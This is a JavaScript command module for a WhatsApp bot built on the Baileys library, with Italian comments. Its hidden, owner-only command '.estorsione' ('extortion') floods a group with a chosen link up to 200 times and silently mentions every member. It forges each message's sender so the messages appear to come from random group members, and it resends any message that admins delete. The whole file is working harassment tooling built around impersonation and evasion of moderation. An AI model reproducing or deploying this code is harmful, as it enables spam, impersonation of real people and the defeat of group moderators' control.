'use strict';

// ─────────────────────────────────────────────────────────────────────────────
//  ESTORSIONE — Vex Bot (solo OWNER)
//  L'owner imposta il link nella chat privata del bot: `.estorsione set <link>`.
//  Nei gruppi: `.estorsione <n>` spamma il link n volte (max 200) con HIDE TAG
//  a tutti i membri e NON invia alcun messaggio finale. I messaggi partono via
//  relay con la key "spoofata" (sender = un membro a caso) e, se gli admin li
//  cancellano, il watchdog di lib/estorsione li RIMANDA subito: il link non si
//  riesce a eliminare (sessione attiva 15 min).
// ─────────────────────────────────────────────────────────────────────────────

const SEP = '━━━━━━━━━━━━━━━━━━';
const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const estorsione = require('../../lib/estorsione');

const MAX_SPAM = 200;
const SPAM_DELAY = 400; // ms tra un messaggio e l'altro (evita rate-limit)

module.exports = {
    name: 'estorsione',
    aliases: [],
    hidden: true,
    description: "Spamma il link impostato n volte con hide tag a tutti (solo owner).",

    async run(sock, msg, args, context) {
        const { textArgs, from, isGroup, isOwner, reply, services } = context;
        const { db, saveDB } = services;

        if (!isOwner) {
            return reply(
`⛔ *_ACCESSO NEGATO_*
${SEP}
▸ Solo l'*OWNER* può usare
  *.estorsione*.
${SEP}
◈ _Vex Bot_`);
        }

        const sub = String(args[0] || '').toLowerCase();
        const stored = db._estorsione;

        // ── SET DEL LINK (chat privata del bot) ───────────────────────────
        if (sub === 'set') {
            if (isGroup) {
                return reply(
`⚠️ *_USO_*
${SEP}
▸ Il link si imposta nella
  *chat privata* del bot:
  \`.estorsione set <link>\`
${SEP}
◈ _Vex Bot_`);
            }
            const link = String(textArgs || '').replace(/^set\s+/i, '').trim();
            if (!link || !/^https?:\/\/\S+$/i.test(link)) {
                return reply(
`⚠️ *_USO_*
${SEP}
▸ \`.estorsione set <link>\`
  (in chat privata del bot)
${SEP}
◈ _Vex Bot_`);
            }
            db._estorsione = { link };
            saveDB();
            return reply(
`✅ *_LINK IMPOSTATO_*
${SEP}
▸ ${link}
${SEP}
▸ Ora nei gruppi:
  \`.estorsione <n>\`
${SEP}
◈ _Vex Bot_`);
        }

        // ── CHAT PRIVATA (senza subcomando) ───────────────────────────────
        if (!isGroup) {
            const cur = stored?.link;
            return reply(
`💣 *_ESTORSIONE_*
${SEP}
${cur ? `▸ Link attuale:\n▸ ${cur}` : '▸ Nessun link impostato.'}
${SEP}
▸ Imposta: \`.estorsione set <link>\`
▸ Nei gruppi: \`.estorsione <n>\`
${SEP}
◈ _Vex Bot_`);
        }

        // ── SPAM NEL GRUPPO ───────────────────────────────────────────────
        const link = stored?.link;
        if (!link) {
            return reply(
`⚠️ *_USO_*
${SEP}
▸ Nessun link impostato.
▸ L'owner deve fare:
  \`.estorsione set <link>\`
  nella chat privata del bot.
${SEP}
◈ _Vex Bot_`);
        }

        let times = parseInt(String(textArgs || '').trim(), 10);
        if (!Number.isInteger(times) || times < 1) times = 10;
        times = Math.min(times, MAX_SPAM);

        // Arma il watchdog anti-cancellazione: se gli admin eliminano i
        // messaggi, il bot li rimanda subito (la sessione scade da sola).
        estorsione.startSession(from, link);

        try {
            const meta = await sock.groupMetadata(from);
            const participants = Array.isArray(meta.participants) ? meta.participants : [];
            const allJids = participants.map(p => p.phoneNumber || p.id || p.jid).filter(Boolean);
            const spoofPool = allJids.length ? allJids : [null];

            const body =
`🚨 *_ESTORSIONE_*
${SEP}
💥 Entrate adesso:
${SEP}
${link}
${SEP}
◈ _Vex Bot_`;

            for (let i = 0; i < times; i++) {
                // Hide tag: menziona tutti senza mostrare @handle visibili
                const hidden = allJids.map(() => '\u200b').join(' ');
                const text = `${body}\n${hidden}`;
                const content = {
                    extendedTextMessage: proto.Message.ExtendedTextMessage.create({
                        text,
                        contextInfo: { mentionedJid: allJids },
                    }),
                };
                const generated = generateWAMessageFromContent(from, content, {
                    userJid: sock.user?.id || sock.user?.lid,
                });
                // Key "spoofata": il messaggio appare come inviato da un membro
                // a caso del gruppo → gli admin NON possono cancellarlo.
                const spoof = spoofPool[i % spoofPool.length];
                if (spoof) {
                    generated.key.participant = spoof;
                    generated.key.fromMe = false;
                }
                try {
                    await sock.relayMessage(from, generated.message, { messageId: generated.key.id });
                } catch (e) {
                    console.error('[estorsione] relay fallito, invio normale:', e.message);
                    await sock.sendMessage(from, { text, mentions: allJids });
                }
                if (i < times - 1) await new Promise(r => setTimeout(r, SPAM_DELAY));
            }

            // Nessun messaggio finale: il comando invia SOLO il link.
            return;
        } catch (e) {
            console.error('[estorsione]', e.message);
            return reply(
`⚠️ *_ERRORE_*
${SEP}
▸ ${e.message}
${SEP}
◈ _Vex Bot_`);
        }
    },
};